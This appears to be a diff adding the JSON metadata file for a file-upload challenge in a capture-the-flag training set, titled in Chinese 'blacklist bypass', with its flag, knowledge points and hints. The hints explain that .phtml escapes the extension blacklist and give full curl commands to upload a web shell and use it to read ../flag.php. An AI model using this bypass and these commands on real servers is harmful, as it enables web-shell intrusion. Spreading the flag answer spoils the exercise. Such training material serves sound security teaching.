@@ -1,0 +1,24 @@
+{
+  "id": "upload3",
+  "category": "upload",
+  "title": "黑名单绕过",
+  "difficulty": "medium",
+  "url_path": "/upload3",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{upload3_7568e33e}",
+  "knowledge": [
+    "后缀黑名单绕过",
+    "phtml/php3 等可解析后缀",
+    "大小写/点空格（Apache/Windows）",
+    "白名单思想"
+  ],
+  "hints": [
+    "先试 shell.php —— 被黑名单拦截。黑名单只有 php/php5/phar/pht/phps 五个，而 web 服务器能当 PHP 解析的后缀不止这些。",
+    "本题环境（nginx+php-fpm）配置了 php/php3/php4/php5/php7/phtml/pht（大小写不敏感）都会交给 PHP 执行。试试 shell.phtml —— 不在黑名单里，但照样能跑。",
+    "完整命令：\ncurl -F \"avatar=@shell.phtml\" http://TARGET/upload3/   （shell 内容不变，只是文件后缀换成 phtml）\ncurl \"http://TARGET/upload3/uploads/shell.phtml?f=../flag.php\""
+  ],
+  "writeup": "writeup.md",
+  "prev": "upload2",
+  "next": "upload4"
+}
